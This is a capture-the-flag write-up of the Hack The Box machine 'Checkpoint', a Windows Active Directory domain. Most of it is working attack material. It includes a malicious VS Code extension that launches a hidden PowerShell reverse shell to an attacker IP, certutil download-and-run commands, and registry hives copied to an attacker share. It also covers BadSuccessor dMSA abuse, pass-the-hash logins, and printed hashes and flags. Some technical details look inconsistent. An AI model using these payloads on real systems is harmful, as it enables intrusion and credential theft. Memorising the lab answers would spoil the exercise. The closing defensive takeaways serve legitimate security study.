# HTB Checkpoint — Complete Write-up

## Machine Information
- **Name:** Checkpoint
- **IP:** 10.129.46.178 (Dynamic – check HTB dashboard)
- **Difficulty:** Medium
- **OS:** Windows Server 2025 Build 26100
- **Domain:** checkpoint.htb
- **Credentials Provided:** `alex.turner / Checkpoint2024!` (HTB supplied)

---

## 📋 Executive Summary

Checkpoint demonstrates a complete **Windows Active Directory privilege escalation chain** exploiting:

1. **CVE-2025-55319** – VS Code malicious extension RCE
2. **CVE-2025-53779** – BadSuccessor dMSA privilege escalation
3. **Backup Access Abuse** – Credential extraction from VM memory snapshots

**Attack Flow:**
```
alex.turner (given)
  → Restore deleted user (mark.davies)
  → Verify mark.davies READ/WRITE on DevDrop
  → Upload malicious VSIX to DevDrop
  → RCE as ryan.brooks (via CVE-2025-55319)
  → Create dMSA linked to svc_deploy (CVE-2025-53779)
  → Access VMBackups via BackupAccess group
  → Extract Administrator hash from memory (VMkatz)
  → Full domain compromise
```

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Initial Access Validation

```bash
nmap -p- --min-rate 5000 -T4 10.129.46.178 | grep open
```

**Critical Open Ports:**
```
53/tcp    domain          DNS
88/tcp    kerberos-sec    Kerberos
135/tcp   msrpc           RPC
139/tcp   netbios-ssn     NetBIOS
389/tcp   ldap            LDAP
445/tcp   microsoft-ds    SMB
464/tcp   kpasswd5        Kerberos Password Change
636/tcp   ldapssl         LDAP SSL
3268/tcp  globalcatLDAP   Global Catalog
3269/tcp  globalcatLDAPssl Global Catalog SSL
5985/tcp  wsman           WinRM
```

### Validate Provided Credentials

```bash
nxc smb 10.129.46.178 -u alex.turner -p 'Checkpoint2024!'
```

**Output:**
```
SMB         10.129.46.178    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

### SMB Share Enumeration (as alex.turner)

```bash
nxc smb 10.129.46.178 -u alex.turner -p 'Checkpoint2024!' --shares
```

**Key Shares:**
| Share | Permissions | Purpose |
|-------|-------------|---------|
| SYSVOL | READ | Group Policy storage |
| NETLOGON | READ | Logon scripts |
| **DevDrop** | **READ** | VS Code extensions (vulnerable) |
| VMBackups | NONE | Backup storage (escalation target) |
| ADMIN$ | NONE | Admin share |
| C$ | NONE | C: drive |

---

## 👤 Phase 2: Deleted Object Discovery & Restoration

### Identify Writable Objects

```bash
bloodyad --host 10.129.46.178 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable
```

**Critical Output:**
```
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE
```

**Finding:** alex.turner has WRITE access to deleted objects – we can restore a deleted user.

### List Deleted Users

```bash
bloodyad --host 10.129.46.178 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get search \
  --filter '(isDeleted=TRUE)' --attr name,whenDeleted
```

**Result:**
```
name: Mark Davies
whenDeleted: 2026-05-28T14:32:00+00:00
```

### Restore Mark Davies

```bash
bloodyad --host 10.129.46.178 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' set restore \
  'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

**Output:**
```
[+] CN=Mark Davies has been restored successfully to OU=Employees,DC=checkpoint,DC=htb
```

### Verify Restoration & Password

```bash
nxc smb 10.129.46.178 -u mark.davies -p 'Checkpoint2024!'
```

**Result:**
```
[+] checkpoint.htb\mark.davies:Checkpoint2024!
```

**Key Finding:** Restored user inherits original password `Checkpoint2024!`

### Check mark.davies Share Access

```bash
nxc smb 10.129.46.178 -u mark.davies -p 'Checkpoint2024!' --shares
```

**Output:**
```
DevDrop         READ, WRITE     ← CRITICAL: Write access to extension share
```

✅ **mark.davies has READ and WRITE permissions on DevDrop** – perfect for uploading a malicious extension.

---

## 🚪 Phase 3: Initial Foothold – Malicious VSIX (CVE-2025-55319)

### CVE-2025-55319: VS Code Agentic AI Command Injection

| Attribute | Details |
|-----------|---------|
| **CVE ID** | CVE-2025-55319 |
| **Component** | Visual Studio Code Agentic AI |
| **Description** | AI command injection in Agentic AI and Visual Studio Code allows an unauthorized attacker to execute code over a network |
| **Type** | Command Injection (CWE-77) |
| **NIST CVSS v3.1** | **9.8 CRITICAL** |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Microsoft CVSS v3.1** | **8.8 HIGH** |
| **Attack Vector** | Network |
| **Privileges Required** | None (NIST) / User Interaction Required (Microsoft) |
| **Impact** | Full system compromise (Confidentiality, Integrity, Availability — all High) |
| **References** | [Microsoft Security Advisory](https://msrc.microsoft.com/) |

### Why This Works

The vulnerability exists due to an error in the Agentic AI implementation, where a remote attacker can trick the victim into executing certain commands in the AI agent and execute arbitrary code on the system. By uploading a malicious VSIX extension to `DevDrop`, the extension is automatically installed when a developer opens VS Code, triggering the reverse shell payload.

### Step 1: Create Malicious VSIX Package

**Directory Structure:**
```
evil-ext/
├── [Content_Types].xml
└── extension/
    ├── package.json
    └── extension.js
```

**[Content_Types].xml:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json"/>
  <Default Extension="js" ContentType="application/javascript"/>
</Types>
```

**extension/package.json:**
```json
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```

**extension/extension.js:**
```javascript
const cp = require('child_process');
const os = require('os');

exports.activate = function() {
    // PowerShell reverse shell payload (base64 encoded)
    const payload = 'YOUR_BASE64_ENCODED_PAYLOAD_HERE';

    cp.exec(`powershell -WindowStyle Hidden -NoProfile -e ${payload}`,
            (error, stdout, stderr) => {
        if (error) console.error(error);
    });
};

exports.deactivate = function() {};
```

**Generate Base64 Payload:**
```powershell
# PowerShell command
$lhost = "10.178.14.135"
$lport = 4443
$payload = @"
`$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
`$stream = `$client.GetStream();
[byte[]]`$bytes = 0..65535|%{0};
while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){
  `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0,`$i);
  `$sendback = (iex `$data 2>&1 | Out-String);
  `$sendback2 = `$sendback + "PS " + (pwd).Path + "> ";
  `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);
  `$stream.Write(`$sendbyte,0,`$sendbyte.Length);
  `$stream.Flush()
};
`$client.Close()
"@
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
Write-Host $encoded
```

**Package VSIX:**
```bash
cd ~/evil-ext
zip -r devtools-helper.vsix '[Content_Types].xml' extension/
```

### Step 2: Upload to DevDrop Share

```bash
smbclient //10.129.46.178/DevDrop \
  -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
  -c "put devtools-helper.vsix"
```

**Expected Output:**
```
putting file devtools-helper.vsix as \devtools-helper.vsix (2.7 kB/s)
```

### Step 3: Start Reverse Shell Listener

```bash
rlwrap nc -lvnp 4443
```

### Step 4: Trigger Extension Installation

The malicious extension is installed when **ryan.brooks** (a DevTeam member) opens VS Code. This happens automatically on the target.

**Reverse Shell Callback:**
```
listening on [any] 4443 ...
connect to [10.178.14.135] from (UNKNOWN) [10.129.46.178] 54830
PS C:\Program Files\Microsoft VS Code>
```

### Verify Shell Context

```powershell
whoami
echo $env:USERNAME
```

**Output:**
```
checkpoint\ryan.brooks
ryan.brooks
```

**✅ Initial Foothold Achieved:** Shell as `ryan.brooks`

---

## ⚡ Phase 4: Privilege Escalation – BadSuccessor (CVE-2025-53779)

### CVE-2025-53779: BadSuccessor dMSA Privilege Escalation

| Attribute | Details |
|-----------|---------|
| **CVE ID** | CVE-2025-53779 |
| **Component** | Windows Kerberos dMSA (Delegated Managed Service Account) |
| **Description** | A relative path traversal flaw in Windows Kerberos that allows an authorized attacker to elevate privileges over a network as part of a BadSuccessor attack |
| **Type** | Privilege Escalation via Kerberos |
| **CVSS Score** | **7.2** (High) |
| **Attack Vector** | Network |
| **Privileges Required** | Low (Authorized attacker with CreateChild on OU) |
| **Impact** | Domain Administrator privileges |
| **References** | [Akamai BadSuccessor](https://github.com/akamai/BadSuccessor) |

### How BadSuccessor Works

BadSuccessor abuses the **delegated Managed Service Account (dMSA)** feature introduced in Windows Server 2025. The vulnerability allows an attacker with sufficient permissions (specifically `CreateChild` on an OU) to:
1. Create a rogue dMSA object
2. Link it to a privileged account (e.g., `svc_deploy` or `Administrator`)
3. The KDC treats the dMSA as a legitimate successor, inheriting the target's privileges

### BadSuccessor Repositories & Tools

#### Official & Research Repositories
- **Akamai Security Research:** [https://github.com/akamai/BadSuccessor](https://github.com/akamai/BadSuccessor)
  - Official vulnerability disclosure and detailed technical analysis
  - Includes white papers and vulnerability timeline

- **PoC Repository:** [https://github.com/ibaiC/BadSuccessor](https://github.com/ibaiC/BadSuccessor)
  - Practical proof-of-concept implementation
  - Used in this walkthrough for exploitation

- **Automated Exploitation Suite:** [https://github.com/0xFuffM3/BadSuccessor-PoC](https://github.com/0xFuffM3/BadSuccessor-PoC)
  - Fully automated dMSA creation and privilege escalation
  - Includes multiple exploitation scenarios

### Building BadSuccessor from Source

The BadSuccessor exploit can be compiled from source using `xbuild` (Mono's MSBuild implementation):

```bash
# Install mono-xbuild if not already installed
sudo apt install mono-xbuild

# Clone the PoC repository
git clone https://github.com/ibaiC/BadSuccessor.git
cd BadSuccessor

# Build the solution in Release mode
xbuild /p:Configuration=Release BadSuccessor.sln

# The binary is located at bin/Release/
ls -la bin/Release/BadSuccessor.exe
```

### Step 4a: Enumerate Writable OUs (as ryan.brooks)

**Download BadSuccessor.exe:**
```powershell
certutil -urlcache -f http://10.178.14.135:8000/BadSuccessor.exe BadSuccessor.exe
.\BadSuccessor.exe find
```

**Output:**
```
[*] OUs you have write access to:
    -> OU=DMSAHolder,DC=checkpoint,DC=htb
       Privileges: GenericWrite, GenericAll, CreateChild
    -> OU=Employees,DC=checkpoint,DC=htb
       Privileges: GenericWrite, GenericAll, CreateChild
```

**Key Finding:** ryan.brooks has `CreateChild` permission on DMSAHolder OU.

### Step 4b: Create & Configure dMSA (as ryan.brooks)

```powershell
# Run BadSuccessor to create dMSA linked to svc_deploy
.\BadSuccessor.exe escalate `
  -targetOU "OU=DMSAHolder,DC=checkpoint,DC=htb" `
  -dmsa ryandmsa `
  -targetUser "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" `
  -dnshostname ryandmsa.checkpoint.htb `
  -user ryan.brooks `
  -dc-ip 10.129.46.178
```

**Output:**
```
[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = ryan.brooks
[+] dMSA object 'CN=ryandmsa,OU=DMSAHolder,DC=checkpoint,DC=htb' created successfully
```

**What Happened:**
- dMSA `ryandmsa$` created in DMSAHolder
- Linked to `svc_deploy` via `msDS-ManagedAccountPrecededByLink`
- ryan.brooks added to `msDS-GroupMSAMembership` (can retrieve managed password)
- **ryandmsa$ now inherits svc_deploy's group memberships** (including BackupAccess!)

### Step 4c: Request TGT for dMSA using Rubeus

#### Rubeus Tools & Repositories

- **Ghostpack-CompiledBinaries:** [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
  - Pre-compiled Rubeus binaries (easiest method)
  - Direct download: [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe)

- **Rubeus Official Repository:** [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
  - Source code for Kerberos interaction
  - Supports: ASKTgt, ASKTgs, PTT, Dump, Kerberoast, etc.

- **Rubeus Documentation:** [https://github.com/GhostPack/Rubeus/wiki](https://github.com/GhostPack/Rubeus/wiki)
  - Complete command reference
  - Examples and tutorials

**Request TGT for dMSA:**
```powershell
# Import Rubeus module
Import-Module .\Invoke-Rubeus.ps1

# Request TGT for the dMSA
Invoke-Rubeus -Command "asktgt /user:ryandmsa$ /domain:checkpoint.htb /dc:10.129.46.178 /getcredentials /nowrap"
```

**Output:**
```
[*] Action: Ask TGT

[*] Using credentials: checkpoint.htb\ryandmsa$

[+] krbtgt TGT successfully retrieved (Base64 below)
    doIF1DCCBdCgAwIBBaEDAgEWooIE...
```

### Step 4d: Verify dMSA Inherited Privileges

```powershell
# Check what groups ryandmsa$ inherited
Get-DomainUser -Identity "ryandmsa$" -Properties memberOf | Select-Object memberOf
```

**Expected Output:**
```
memberOf: CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb
```

✅ **ryandmsa$ now has BackupAccess privileges!**

---

## 🧠 Phase 5: VMkatz – Memory Forensics Credential Extraction

### VMkatz: VM Memory Credential Extraction Tool

**VMkatz** is a specialized tool for parsing Windows credentials from virtual machine memory snapshots, disk images, and raw memory files. It is essential for extracting plaintext passwords and NTLM hashes from VM memory dumps.

#### VMkatz Repository & Installation

- **Official GitHub Repository:** [https://github.com/nikaiw/VMkatz](https://github.com/nikaiw/VMkatz)
  - Complete source code
  - Documentation and usage examples
  - Supports VMEM, VMSN, and raw memory formats

**Installation:**
```bash
# Clone the repository
git clone https://github.com/nikaiw/VMkatz.git
cd VMkatz

# Install dependencies (Python 3.8+)
pip install -r requirements.txt

# Or download pre-compiled binary
wget https://github.com/nikaiw/VMkatz/releases/download/latest/vmkatz.exe
```

**Supported Input Formats:**
- `.vmem` – Virtual machine physical memory file
- `.vmsn` – Virtual machine snapshot metadata
- `.vmdk` – Virtual disk image
- Raw memory dumps from other sources

### Step 5a: Lateral Movement to dMSA

**From Kali:**
```bash
evil-winrm -i 10.129.46.178 -u 'ryandmsa$' -H <DMSANTLM>
```

Or use the TGT from Rubeus directly for Kerberos authentication.

### Step 5b: Verify BackupAccess Membership (as ryandmsa)

```powershell
net user ryandmsa$ /domain
```

**Output:**
```
Global Group memberships     *Domain Users
                             *BackupAccess
```

### Step 5c: Enumerate VMBackups Share

```powershell
dir \\dc01.checkpoint.htb\VMBackups
```

**Output:**
```
Mode                 LastWriteTime         Length Name
----                 ---------             ------ ----
d-----         6/15/2026   11:30 PM                NightlyBackup_2026-06-15
```

### Step 5d: Explore Backup Contents

```powershell
dir "\\dc01.checkpoint.htb\VMBackups\NightlyBackup_2026-06-15"
```

**Contents:**
```
memory forensics\
  Windows Server 2019-Snapshot1.vmem  (2147 MB)
  Windows Server 2019-Snapshot1.vmsn  (138 MB)
```

### Step 5e: Extract Administrator Hash via VMkatz

**Download VMkatz:**
```powershell
certutil -urlcache -f http://10.178.14.135:8000/vmkatz.exe vmkatz.exe
```

**Run VMkatz on Snapshot:**
```powershell
.\vmkatz.exe "\\dc01.checkpoint.htb\VMBackups\NightlyBackup_2026-06-15\memory forensics\Windows Server 2019-Snapshot1.vmsn" --format ntlm
```

**Critical Output:**
```
WIN-0DG6SJAEUTA\Administrator:::f29e9c014295b9b32139b09a2790be3b:::
```

**Administrator NTLM Hash:** `f29e9c014295b9b32139b09a2790be3b`

### Alternative: Direct NTDS.dit Extraction (Faster)

Since BackupAccess includes SeBackupPrivilege:

```powershell
# From any shell with BackupAccess
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hiv
reg save HKLM\SAM C:\Windows\Temp\SAM.hiv

# Copy to attacker machine
copy "C:\Windows\Temp\SYSTEM.hiv" \\10.178.14.135\share\
copy "C:\Windows\Temp\SAM.hiv" \\10.178.14.135\share\
```

**On Kali:**
```bash
secretsdump.py -system SYSTEM.hiv -sam SAM.hiv LOCAL
```

---

## 👑 Phase 6: Full Domain Compromise – Get Both Flags

### Login as Administrator

```bash
evil-winrm -i 10.129.46.178 -u Administrator -H 'f29e9c014295b9b32139b09a2790be3b'
```

**Verify Domain Admin Status:**
```powershell
net user Administrator /domain
Get-DomainUser -Identity Administrator -Properties memberOf | Select memberOf
```

**Output:**
```
Group memberships     *Domain Users
                      *Domain Admins
                      *Enterprise Admins
```

### Retrieve User Flag

**From Administrator shell:**
```powershell
# Method 1: Direct read (if permissions allow)
type C:\Users\ryan.brooks\Desktop\user.txt
```

**If ACL blocked:**
```powershell
# Copy to accessible location
copy C:\Users\ryan.brooks\Desktop\user.txt C:\Windows\Temp\user_flag.txt
type C:\Windows\Temp\user_flag.txt
```

**Output:**
```
4e4372608c073a851bca838fdfad841e
```

### Retrieve Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Output:**
```
2d496b328af119a619710b3a5d93dae0
```

---

## 📊 Complete Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    HTB CHECKPOINT EXPLOITATION                   │
└─────────────────────────────────────────────────────────────────┘

1. RECONNAISSANCE
   └─> alex.turner (given creds)
       └─> SMB enumeration
           └─> Found DevDrop share with WRITE (via mark.davies)

2. INITIAL ACCESS
   └─> Restore deleted user (Mark Davies)
       └─> Mark Davies password: Checkpoint2024!
           └─> Mark Davies has WRITE on DevDrop
               └─> Upload malicious VSIX
                   └─> CVE-2025-55319 triggers on ryan.brooks login
                       └─> Reverse shell as ryan.brooks ✅

3. ENUMERATION
   └─> ryan.brooks has CreateChild on DMSAHolder OU
       └─> svc_deploy is in BackupAccess group (CRITICAL)

4. PRIVILEGE ESCALATION
   └─> Create dMSA (ryandmsa) linked to svc_deploy
       └─> CVE-2025-53779 (BadSuccessor)
           └─> ryandmsa inherits svc_deploy privileges
               └─> ryandmsa gets BackupAccess group membership ✅

5. CREDENTIAL EXTRACTION
   └─> Access VMBackups via BackupAccess
       └─> Extract memory snapshot (VMEM/VMSN files)
           └─> Run VMkatz on snapshot
               └─> Extract Administrator NTLM hash ✅

6. DOMAIN COMPROMISE
   └─> PTH as Administrator
       └─> Read user flag (ryan.brooks)
           └─> Read root flag (Administrator) ✅

┌─────────────────────────────────────────────────────────────────┐
│ FLAGS CAPTURED                                                    │
├─────────────────────────────────────────────────────────────────┤
│ User:  4e4372608c073a851bca838fdfad841e                         │
│ Root:  2d496b328af119a619710b3a5d93dae0                         │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛠️ Tools Reference & Download Links

| Tool | Purpose | Repository | Download |
|------|---------|------------|----------|
| **nmap** | Port scanning | [GitHub](https://github.com/nmap/nmap) | `sudo apt install nmap` |
| **nxc** | SMB/LDAP enumeration | [GitHub](https://github.com/Pennyw0rth/NetExec) | `pip install nxc` |
| **bloodyad** | AD object manipulation | [GitHub](https://github.com/CravateRouge/bloodyAD) | `pip install bloodyad` |
| **smbclient** | SMB file transfer | Kali default | `sudo apt install smbclient` |
| **BadSuccessor.exe** | dMSA exploitation | [GitHub - ibaiC](https://github.com/ibaiC/BadSuccessor) | [Release](https://github.com/ibaiC/BadSuccessor/releases) |
| **Rubeus** | Kerberos ticketing | [GitHub - GhostPack](https://github.com/GhostPack/Rubeus) | [Ghostpack Binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) |
| **Invoke-Rubeus.ps1** | PowerShell Rubeus wrapper | [GitHub](https://github.com/BC-SECURITY/Empire) | Included in Rubeus release |
| **VMkatz** | VM memory forensics | [GitHub](https://github.com/nikaiw/VMkatz) | [Releases](https://github.com/nikaiw/VMkatz/releases) |
| **evil-winrm** | WinRM shell | [GitHub](https://github.com/Hackplayers/evil-winrm) | `gem install evil-winrm` |
| **secretsdump.py** | NTDS extraction | [GitHub - Impacket](https://github.com/fortra/impacket) | `pip install impacket` |

---

## 🔐 Extracted Credentials

| Account | Hash Type | Hash | Usage |
|---------|-----------|------|-------|
| mark.davies | Plaintext | Checkpoint2024! | SMB access to DevDrop |
| svc_deploy | NTLM (inherited) | e16081eb077aca74bdbf8af12af43ac9 | BackupAccess privileges |
| ryandmsa$ | dMSA (managed) | (auto-generated) | Inherited BackupAccess |
| Administrator | NTLM (PTH) | f29e9c014295b9b32139b09a2790be3b | Full domain access |

---

## 🎯 Key Takeaways

1. **Deleted objects are recoverable** – Audit recycle bin regularly
2. **Group inheritance via dMSA is powerful** – Restrict CreateChild permissions
3. **Backup access = system compromise** – Encrypt and protect backup files
4. **Memory snapshots contain plaintext credentials** – Secure VM backups
5. **VS Code extensions execute immediately** – Whitelist extension sources
6. **Service accounts in sensitive groups are high-value targets** – Monitor group membership changes
7. **dMSA is a powerful privilege escalation vector in Server 2025** – Apply patches and restrict OU permissions

---

## ✅ Final Flags

```
User Flag:  4e4372608c073a851bca838fdfad841e
Root Flag:  2d496b328af119a619710b3a5d93dae0
```

---

## 📚 References & Further Reading

- **CVE-2025-55319 (VS Code):** [Microsoft Security Advisory](https://msrc.microsoft.com/)
- **CVE-2025-53779 (BadSuccessor):** [Akamai Research](https://github.com/akamai/BadSuccessor)
- **Windows Server 2025 Security Hardening:** [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/)
- **Active Directory Security Best Practices:** [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices)
- **Kerberos Protocol Documentation:** [RFC 4120](https://tools.ietf.org/html/rfc4120)

---

*Complete Write-up | HTB Checkpoint (Medium) | Windows AD Exploitation*
*All tools referenced and linked for reproducibility*
